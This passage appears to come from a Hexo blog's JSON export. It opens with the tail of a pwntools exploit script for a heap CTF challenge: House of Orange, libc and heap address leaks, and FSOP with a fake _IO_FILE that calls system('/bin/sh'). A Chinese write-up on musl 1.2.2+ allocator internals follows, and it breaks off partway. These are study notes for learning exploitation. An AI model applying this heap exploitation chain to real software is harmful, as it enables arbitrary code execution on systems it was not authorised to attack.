class=\"line\">upgrade(<span class=\"number\">0x50</span>,payload,<span class=\"number\">1</span>,<span class=\"number\">56746</span>) </span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">add(<span class=\"number\">0xfc0</span>,<span class=\"string\">&#x27;aaaabbbb&#x27;</span>,<span class=\"number\">1</span>,<span class=\"number\">56746</span>) <span class=\"comment\"># house of orange free top chunk</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">add(<span class=\"number\">0x600</span>,<span class=\"string\">&#x27;ccccdddd&#x27;</span>,<span class=\"number\">1</span>,<span class=\"number\">56746</span>) <span class=\"comment\"># cut a large bin chunk from old top chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc and heap address by bk and fd_nextsize</span></span><br><span class=\"line\">see()</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Name of house : &quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;ccccdddd&quot;</span>)</span><br><span class=\"line\">libcbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>]) -<span class=\"number\">0x610</span> -<span class=\"number\">88</span> -<span class=\"number\">0x10</span> -libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">upgrade(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">56746</span>)</span><br><span class=\"line\">see()</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Name of house : &quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0xd0</span></span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapbase&quot;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># FSOP</span></span><br><span class=\"line\">IO_list_all=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_list_all&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;IO_list_all&quot;</span>,<span class=\"built_in\">hex</span>(IO_list_all))</span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x600</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">0x0000ddaa00000001</span>)+p64(<span class=\"number\">0</span>) <span class=\"comment\"># before unsorted bin</span></span><br><span class=\"line\">fakefile=<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>+p64(<span class=\"number\">0x61</span>)+p64(<span class=\"number\">0</span>)+p64(IO_list_all-<span class=\"number\">0x10</span>) <span class=\"comment\"># reset bk and construct fake _IO_2_1_stdout</span></span><br><span class=\"line\"><span class=\"comment\"># construct fake _IO_2_1_stdout</span></span><br><span class=\"line\">fakefile+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>) <span class=\"comment\"># write_base &lt; write_ptr</span></span><br><span class=\"line\">fakefile=fakefile.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fakefile+=p64(heapbase+<span class=\"number\">0x700</span>+<span class=\"number\">0xf0</span>-<span class=\"number\">0x18</span>) <span class=\"comment\"># vtable</span></span><br><span class=\"line\">fakefile+=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">fakefile+=p64(sys_addr)</span><br><span class=\"line\">payload+=fakefile</span><br><span class=\"line\">leak(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(IO_list_all))</span><br><span class=\"line\">upgrade(<span class=\"number\">0x600</span>+<span class=\"built_in\">len</span>(payload),payload,<span class=\"number\">1</span>,<span class=\"number\">56746</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"><span class=\"comment\"># trigger by add</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Your choice : &quot;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"musl pwn","date":"2023-03-26T07:25:10.000Z","_content":"\nmusl而非glibc的堆，据说1.2.1和glibc很像，但从1.2.2之后和glibc差别很大，所以来看看1.2.2之后的。\n<!--more-->\n\n## 基本数据结构\n\n在free或者malloc chunk的时候从chunk到group再到meta**从小到大索引**\n\n### chunk\n\n```c\nstruct chunk{\n char prev_user_data[];\n    uint8_t idx;  //低5bit为idx第几个chunk\n    uint16_t offset; //与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！ UNIT=0x10\n    char data[];\n};\n```\n\n在释放后 chunk 头的 **idx会变成0xff offset 会清零**\n\n和glibc 的chunk 类似 glibc chunk 可以占用下一个chunk 的prev_size 空间\n\n而musl 可以使用 下一个chunk 头的**低4B** 来储存数据\n\n### group\n\n```c\n#define UNIT 16\n#define IB 4\nstruct group {\n    struct meta *meta;\n    unsigned char active_idx:5; //低5bit\n    char pad[UNIT - sizeof(struct meta *) - 1];//padding=0x10B UNIT=0x10\n    unsigned char storage[];// chunks\n};\n```\n\n- 在musl 中**同一类**大小的chunk 都是被分配到 **同一个**group 中进行管理\n- musl 是通过 **chunk addr 和chunk 头对应的 offset** 来索引到 group 地址的\n- 整体作为一个 group，其中开头的0x10我们当作group 头，这里的group头涵盖了第一个chunk的头数据，第一个chunk在这之后开始\n- group开头的**8个字节**存的 meta 的地址，**后面8个字节**存了**第一个chunk 的头数据 和 active_idx**\n- 这里active_idx 代表**能存下**的多少个可以用的同类型chunk（**[0,active_idx]，即active_idx+1个**）\n\n从`chunk`索引到`group`：`group_addr = chunk_addr - 0x10 * offset - 0x10`\n\n### meta\n\n```c\nstruct meta {\n    struct meta *prev, *next;//双向链表\n    struct group *mem;// 这里指向管理的group 地址\n    volatile int avail_mask, freed_mask;\n    uintptr_t last_idx:5;\n    uintptr_t freeable:1;\n    uintptr_t sizeclass:6;\n    uintptr_t maplen:8*sizeof(uintptr_t)-12;\n};\n```\n\n其中如果这个meta 前后都没有，那么它的prev next 就**指向它自己**\n\n**avail_mask，freed_mask** 是**bitmap**的形式体现 chunk 的状态\n\n- 在 avail_mask 中 2 进制的**0表示不可分配1表示可分配**，顺序是**从后到前，最前面那个0不算，只是为了对齐**\n- avail代表还**未被分配**出去，freed代表已经**被分配但是被释放**了\n- 如01111000 中最后的 3个0 ， 表示第1、2、3个 chunk 是不可分配的 前面4个chunk 是可以分配的\n- 在 free_mask 中的 **1表示已经被释放**\n\n**last_idx**可以表示最多**可用堆块的数量**，最多数量**=last_idx+1**(因为是从[0,last_idx])\n\n**freeable=1**代表meta否**可以被回收**，freeable=0代表**不可以**\n\n**sizeclass**表示由哪个group进行管理这一类的大小的chunk\n\n**maplen>= 1**表示这个meta里的group是新mmap出来的，长度为`meta->maplen = (needed+4095)/4096`，并且这个group **不在size_classes里**\n\n**maplen=0**表示group 不是新mmap出来的**在size_classes里**\n\n**tips:**\n\n- **meta 一般申请的是堆空间brk 分配的，有可能是mmap 映射的，而group 都是使用的mmap 的空间**\n- **由于bitmap的限制, 因此一个group中最多只能有32个chunk**\n\n### meta_arena\n\n```c\nstruct meta_area {\n    uint64_t check;\n    struct meta_area *next;\n    int nslots;\n    struct meta slots[]; //管理的meta的地址\n};\n```\n\nmeta_area 是管理meta的合集，meta_area以**页**为单位分配 所以计算地址如下：\n\n`const struct meta_area *area = (void* )((uintptr_t)meta & -4096)`\n\n**check**:是个校验数字 保护meta_area 里的meta，**防止meta被伪造**\n\n**meta_area \\*next** 指向下一个meta_area 如果没有就**默认为0**\n\n**nslots**: meta槽的**数量**\n\n**细节**:在这个meta_area 页被使用的时候 上一个临近的页 会被设置为不可写\n\n### malloc_context\n\n```c\nstruct malloc_context {\n    uint64_t secret;// 和meta_area 头的check 是同一个值 就是校验值\n#ifndef PAGESIZE\n    size_t pagesize;\n#endif\n    int init_done;//是否初始化标记\n    unsigned mmap_counter;// 记录有多少mmap 的内存的数量\n    struct meta *free_meta_head;// 被free的meta头 这里meta管理使用了队列和双向循环链表\n    struct meta *avail_meta;//指向可用meta数组\n    size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;\n    struct meta_area *meta_area_head, *meta_area_tail;\n    unsigned char *avail_meta_areas;\n    struct meta *active[48];// 记录着可用的meta\n    size_t u sage_by_class[48];\n    uint8_t unmap_seq[32], bounces[32];\n    uint8_t seq;\n    uintptr_t brk;\n};\n```\n\n## 内存分配与释放\n\n### 分配\n\n1. 若申请的chunk 没超过阈值 就从active 队列找管理对应size大小的meta\n\n2. 关于找对应size的meta 这里有两种情况:\n\n    - 如果active 对应size的meta 位置上为空，没找到那么尝试先找size更大的meta\n\n    - 如果active 对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk(这里malloc 那个循环:`for (;;)`，\n\n        - 如果通过循环里，通过meta->avail_mask 判断当前group 中是否有空闲chunk\n            - 有，就直接修改meta->avail_mask，然后利用enframe(g, idx, n, ctr);// 从对应meta 中的group 取出 第idx号chunk分配\n            - 无，break 跳出循环\n\n        - 跳出循环后执行`idx = alloc_slot(sc, n);alloc_slot`有三种分配方式:\n\n            - **使用group中被free的chunk**\n\n            - **从队列中其他meta的group 中找**\n\n            - 如果都不行就重新分配一个新的group 对应一个新的meta\n\n3. enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk\n\n### 释放\n\n1. 通过get_meta(p)得到meta (get_meta 是通过chunk 对应的offset 索引到对应的group 再索引到meta) \n\n2. 通过get_slot_index(p)得到对应chunk的 idx ``-``> 通过get_nominal_size(p, end) 算出真实大小\n\n3. 重置idx 和 offset idx 被置为``0xff` `标记chunk\n\n4. 修改freed_mask标记chunk被释放\n\n5. 最后调用nontrivial_free完成关于meta一些剩余操作 (注意进入nontrivial_free 是在``for``循环外 还未设置)\n\n**注意**\n\n1. 释放chunk的时候，先只会修改freed_mask,不会修改avail_mask，说明chunk 在释放后，不会立即被复用\n2. 注意进入nontrivial_free 是在``for``循环外 还未设置freed_mask 跳出循环的条件是  `if (!freed || mask+self==all) break;`\n\n3. free中chunk的起始位置可以通过chunk的idx定位\n","source":"_posts/musl_pwn.md","raw":"---\ntitle: musl pwn\ndate: 2023-03-26 15:25:10\ncategories: \n- pwn\ntags: \n- pwn\n- musl\n- heap\n\n---\n\nmusl而非glibc的堆，据说1.2.1和glibc很像，但从1.2.2之后和glibc差别很大，所以来看看1.2.2之后的。\n<!--more-->\n\n## 基本数据结构\n\n在free或者malloc chunk的时候从chunk到group再到meta**从小到大索引**\n\n### chunk\n\n```c\nstruct chunk{\n char prev_user_data[];\n    uint8_t idx;  //低5bit为idx第几个chunk\n    uint16_t offset; //与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！ UNIT=0x10\n    char data[];\n};\n```\n\n在释放后 chunk 头的 **idx会变成0xff offset 会清零**\n\n和glibc 的chunk 类似 glibc chunk 可以占用下一个chunk 的prev_size 空间\n\n而musl 可以使用 下一个chunk 头的**低4B** 来储存数据\n\n### group\n\n```c\n#define UNIT 16\n#define IB 4\nstruct group {\n    struct meta *meta;\n    unsigned char active_idx:5; //低5bit\n    char pad[UNIT - sizeof(struct meta *) - 1];//padding=0x10B UNIT=0x10\n    unsigned char storage[];// chunks\n};\n```\n\n- 在musl 中**同一类**大小的chunk 都是被分配到 **同一个**group 中进行管理\n- musl 是通过 **chunk addr 和chunk 头对应的 offset** 来索引到 group 地址的\n- 整体作为一个 group，其中开头的0x10我们当作group 头，这里的group头涵盖了第一个chunk的头数据，第一个chunk在这之后开始\n- group开头的**8个字节**存的 meta 的地址，**后面8个字节**存了**第一个chunk 的头数据 和 active_idx**\n- 这里active_idx 代表**能存下**的多少个可以用的同类型chunk（**[0,active_idx]，即active_idx+1个**）\n\n从`chunk`索引到`group`：`group_addr = chunk_addr - 0x10 * offset - 0x10`\n\n### meta\n\n```c\nstruct meta {\n    struct meta *prev, *next;//双向链表\n    struct group *mem;// 这里指向管理的group 地址\n    volatile int avail_mask, freed_mask;\n    uintptr_t last_idx:5;\n    uintptr_t freeable:1;\n    uintptr_t sizeclass:6;\n    uintptr_t maplen:8*sizeof(uintptr_t)-12;\n};\n```\n\n其中如果这个meta 前后都没有，那么它的prev next 就**指向它自己**\n\n**avail_mask，freed_mask** 是**bitmap**的形式体现 chunk 的状态\n\n- 在 avail_mask 中 2 进制的**0表示不可分配1表示可分配**，顺序是**从后到前，最前面那个0不算，只是为了对齐**\n- avail代表还**未被分配**出去，freed代表已经**被分配但是被释放**了\n- 如01111000 中最后的 3个0 ， 表示第1、2、3个 chunk 是不可分配的 前面4个chunk 是可以分配的\n- 在 free_mask 中的 **1表示已经被释放**\n\n**last_idx**可以表示最多**可用堆块的数量**，最多数量**=last_idx+1**(因为是从[0,last_idx])\n\n**freeable=1**代表meta否**可以被回收**，freeable=0代表**不可以**\n\n**sizeclass**表示由哪个group进行管理这一类的大小的chunk\n\n**maplen>= 1**表示这个meta里的group是新mmap出来的，长度为`meta->maplen = (needed+4095)/4096`，并且这个group **不在size_classes里**\n\n**maplen=0**表示group 不是新mmap出来的**在size_classes里**\n\n**tips:**\n\n- **meta 一般申请的是堆空间brk 分配的，有可能是mmap 映射的，而group 都是使用的mmap 的空间**\n- **由于bitmap的限制, 因此一个group中最多只能有32个chunk**\n\n### meta_arena\n\n```c\nstruct meta_area {\n    uint64_t check;\n    struct meta_area *next;\n    int nslots;\n    struct meta slots[]; //管理的meta的地址\n};\n```\n\nmeta_area 是管理meta的合集，meta_area以**页**为单位分配 所以计算地址如下：\n\n`const struct meta_area *area = (void* )((uintptr_t)meta & -4096)`\n\n**check**:是个校验数字 保护meta_area 里的meta，**防止meta被伪造**\n\n**meta_area \\*next** 指向下一个meta_area 如果没有就**默认为0**\n\n**nslots**: meta槽的**数量**\n\n**细节**:在这个meta_area 页被使用的时候 上一个临近的页 会被设置为不可写\n\n### malloc_context\n\n```c\nstruct malloc_context {\n    uint64_t secret;// 和meta_area 头的check 是同一个值 就是校验值\n#ifndef PAGESIZE\n    size_t pagesize;\n#endif\n    int init_done;//是否初始化标记\n    unsigned mmap_counter;// 记录有多少mmap 的内存的数量\n    struct meta *free_meta_head;// 被free的meta头 这里meta管理使用了队列和双向循环链表\n    struct meta *avail_meta;//指向可用meta数组\n    size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;\n    struct meta_area *meta_area_head, *meta_area_tail;\n    unsigned char *avail_meta_areas;\n    struct meta *active[48];// 记录着可用的meta\n    size_t u sage_by_class[48];\n    uint8_t unmap_seq[32], bounces[32];\n    uint8_t seq;\n    uintptr_t brk;\n};\n```\n\n## 内存分配与释放\n\n### 分配\n\n1. 若申请的chunk 没超过阈值 就从active 队列找管理对应size大小的meta\n\n2. 关于找对应size的meta 这里有两种情况:\n\n    - 如果active 对应size的meta 位置上为空，没找到那么尝试先找size更大的meta\n\n    - 如果active 对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk(这里malloc 那个循环:`for (;;)`，\n\n        - 如果通过循环里，通过meta->avail_mask 判断当前group 中是否有空闲chunk\n            - 有，就直接修改meta->avail_mask，然后利用enframe(g, idx, n, ctr);// 从对应meta 中的group 取出 第idx号chunk分配\n            - 无，break 跳出循环\n\n        - 跳出循环后执行`idx = alloc_slot(sc, n);alloc_slot`有三种分配方式:\n\n            - **使用group中被free的chunk**\n\n            - **从队列中其他meta的group 中找**\n\n            - 如果都不行就重新分配一个新的group 对应一个新的meta\n\n3. enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk\n\n### 释放\n\n1. 通过get_meta(p)得到meta (get_meta 是通过chunk 对应的offset 索引到对应的group 再索引到meta) \n\n2. 通过get_slot_index(p)得到对应chunk的 idx ``-``> 通过get_nominal_size(p, end) 算出真实大小\n\n3. 重置idx 和 offset idx 被置为``0xff` `标记chunk\n\n4. 修改freed_mask标记chunk被释放\n\n5. 最后调用nontrivial_free完成关于meta一些剩余操作 (注意进入nontrivial_free 是在``for``循环外 还未设置)\n\n**注意**\n\n1. 释放chunk的时候，先只会修改freed_mask,不会修改avail_mask，说明chunk 在释放后，不会立即被复用\n2. 注意进入nontrivial_free 是在``for``循环外 还未设置freed_mask 跳出循环的条件是  `if (!freed || mask+self==all) break;`\n\n3. free中chunk的起始位置可以通过chunk的idx定位\n","slug":"musl_pwn","published":1,"updated":"2023-03-28T05:12:14.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag6004d5oudccnpfyyw","content":"<p>musl而非glibc的堆，据说1.2.1和glibc很像，但从1.2.2之后和glibc差别很大，所以来看看1.2.2之后的。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"基本数据结构\"><a href=\"#基本数据结构\" class=\"headerlink\" title=\"基本数据结构\"></a>基本数据结构</h2><p>在free或者malloc chunk的时候从chunk到group再到meta<strong>从小到大索引</strong></p>\n<h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a>chunk</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">chunk</span>&#123;</span></span><br><span class=\"line\"> <span class=\"type\">char</span> prev_user_data[];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> idx;  <span class=\"comment\">//低5bit为idx第几个chunk</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> offset; <span class=\"comment\">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！ UNIT=0x10</span></span><br><span class=\"line\">    <span class=\"type\">char</span> data[];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>在释放后 chunk 头的 <strong>idx会变成0xff offset 会清零</strong></p>\n<p>和glibc 的chunk 类似 glibc chunk 可以占用下一个chunk 的prev_size 空间</p>\n<p>而musl 可以使用 下一个chunk 头的<strong>低4B</strong> 来储存数据</p>\n<h3 id=\"group\"><a href=\"#group\" class=\"headerlink\" title=\"group\"></a>group</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> UNIT 16</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IB 4</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">meta</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> active_idx:<span class=\"number\">5</span>; <span class=\"comment\">//低5bit</span></span><br><span class=\"line\">    <span class=\"type\">char</span> pad[UNIT - <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> meta *) - <span class=\"number\">1</span>];<span class=\"comment\">//padding=0x10B UNIT=0x10</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> storage[];<span class=\"comment\">// chunks</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在musl 中<strong>同一类</strong>大小的chunk 都是被分配到 <strong>同一个</strong>group 中进行管理</li>\n<li>musl 是通过 <strong>chunk addr 和chunk 头对应的 offset</strong> 来索引到 group 地址的</li>\n<li>整体作为一个 group，其中开头的0x10我们当作group 头，这里的group头涵盖了第一个chunk的头数据，第一个chunk在这之后开始</li>\n<li>group开头的<strong>8个字节</strong>存的 meta 的地址，<strong>后面8个字节</strong>存了<strong>第一个chunk 的头数据 和 active_idx</strong></li>\n<li>这里active_idx 代表<strong>能存下</strong>的多少个可以用的同类型chunk（**[0,active_idx]，即active_idx+1个**）</li>\n</ul>\n<p>从<code>chunk</code>索引到<code>group</code>：<code>group_addr = chunk_addr - 0x10 * offset - 0x10</code></p>\n<h3 id=\"meta\"><a href=\"#meta\" class=\"headerlink\" title=\"meta\"></a>meta</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">prev</span>, *<span class=\"title\">next</span>;</span><span class=\"comment\">//双向链表</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group</span> *<span class=\"title\">mem</span>;</span><span class=\"comment\">// 这里指向管理的group 地址</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> <span class=\"type\">int</span> avail_mask, freed_mask;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> last_idx:<span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> freeable:<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> sizeclass:<span class=\"number\">6</span>;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> maplen:<span class=\"number\">8</span>*<span class=\"keyword\">sizeof</span>(<span class=\"type\">uintptr_t</span>)<span class=\"number\">-12</span>;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>其中如果这个meta 前后都没有，那么它的prev next 就<strong>指向它自己</strong></p>\n<p><strong>avail_mask，freed_mask</strong> 是<strong>bitmap</strong>的形式体现 chunk 的状态</p>\n<ul>\n<li>在 avail_mask 中 2 进制的<strong>0表示不可分配1表示可分配</strong>，顺序是<strong>从后到前，最前面那个0不算，只是为了对齐</strong></li>\n<li>avail代表还<strong>未被分配</strong>出去，freed代表已经<strong>被分配但是被释放</strong>了</li>\n<li>如01111000 中最后的 3个0 ， 表示第1、2、3个 chunk 是不可分配的 前面4个chunk 是可以分配的</li>\n<li>在 free_mask 中的 <strong>1表示已经被释放</strong></li>\n</ul>\n<p><strong>last_idx</strong>可以表示最多<strong>可用堆块的数量</strong>，最多数量**=last_idx+1**(因为是从[0,last_idx])</p>\n<p><strong>freeable=1</strong>代表meta否<strong>可以被回收</strong>，freeable=0代表<strong>不可以</strong></p>\n<p><strong>sizeclass</strong>表示由哪个group进行管理这一类的大小的chunk</p>\n<p><strong>maplen&gt;= 1</strong>表示这个meta里的group是新mmap出来的，长度为<code>meta-&gt;maplen = (needed+4095)/4096</code>，并且这个group <strong>不在size_classes里</strong></p>\n<p><strong>maplen=0</strong>表示group 不是新mmap出来的<strong>在size_classes里</strong></p>\n<p><strong>tips:</strong></p>\n<ul>\n<li><strong>meta 一般申请的是堆空间brk 分配的，有可能是mmap 映射的，而group 都是使用的mmap 的空间</strong></li>\n<li><strong>由于bitmap的限制, 因此一个group中最多只能有32个chunk</strong></li>\n</ul>\n<h3 id=\"meta-arena\"><a href=\"#meta-arena\" class=\"headerlink\" title=\"meta_arena\"></a>meta_arena</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta_area</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> check;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta_area</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> nslots;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> <span class=\"title\">slots</span>[];</span> <span class=\"comment\">//管理的meta的地址</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>meta_area 是管理meta的合集，meta_area以<strong>页</strong>为单位分配 所以计算地址如下：</p>\n<p><code>const struct meta_area *area = (void* )((uintptr_t)meta &amp; -4096)</code></p>\n<p><strong>check</strong>:是个校验数字 保护meta_area 里的meta，<strong>防止meta被伪造</strong></p>\n<p><strong>meta_area *next</strong> 指向下一个meta_area 如果没有就<strong>默认为0</strong></p>\n<p><strong>nslots</strong>: meta槽的<strong>数量</strong></p>\n<p><strong>细节</strong>:在这个meta_area 页被使用的时候 上一个临近的页 会被设置为不可写</p>\n<h3 id=\"malloc-context\"><a href=\"#malloc-context\" class=\"headerlink\" title=\"malloc_context\"></a>malloc_context</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_context</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> secret;<span class=\"comment\">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> PAGESIZE</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> pagesize;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    <span class=\"type\">int</span> init_done;<span class=\"comment\">//是否初始化标记</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> mmap_counter;<span class=\"comment\">// 记录有多少mmap 的内存的数量</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">free_meta_head</span>;</span><span class=\"comment\">// 被free的meta头 这里meta管理使用了队列和双向循环链表</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">avail_meta</span>;</span><span class=\"comment\">//指向可用meta数组</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta_area</span> *<span class=\"title\">meta_area_head</span>, *<span class=\"title\">meta_area_tail</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *avail_meta_areas;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">active</span>[48];</span><span class=\"comment\">// 记录着可用的meta</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> u sage_by_class[<span class=\"number\">48</span>];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> unmap_seq[<span class=\"number\">32</span>], bounces[<span class=\"number\">32</span>];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> seq;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> brk;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"内存分配与释放\"><a href=\"#内存分配与释放\" class=\"headerlink\" title=\"内存分配与释放\"></a>内存分配与释放</h2><h3 id=\"分配\"><a href=\"#分配\" class=\"headerlink\" title=\"分配\"></a>分配</h3><ol>\n<li><p>若申请的chunk 没超过阈值 就从active 队列找管理对应size大小的meta</p>\n</li>\n<li><p>关于找对应size的meta 这里有两种情况:</p>\n<ul>\n<li><p>如果active 对应size的meta 位置上为空，没找到那么尝试先找size更大的meta</p>\n</li>\n<li><p>如果active 对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk(这里malloc 那个循环:<code>for 